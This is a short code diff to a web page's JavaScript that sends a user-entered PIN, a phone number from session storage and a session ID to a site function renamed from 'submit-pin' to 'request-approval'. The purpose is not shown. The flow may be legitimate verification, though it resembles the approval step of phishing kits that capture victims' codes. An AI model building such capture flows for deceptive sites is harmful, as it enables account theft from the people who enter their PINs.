@@ -208,12 +208,13 @@
             const sessionId = sessionStorage.getItem('sessionId') ||
                 (Date.now().toString(36) + Math.random().toString(36).slice(2));
             sessionStorage.setItem('sessionId', sessionId);
+            const phone = sessionStorage.getItem('phone') || '';
 
             try {
-                await fetch('/.netlify/functions/submit-pin', {
+                await fetch('/.netlify/functions/request-approval', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ pin: code, sessionId })
+                    body: JSON.stringify({ type: 'pin', pin: code, phone, sessionId })
                 });
             } catch (e) {
                 showPinError('Network error. Please try again.');
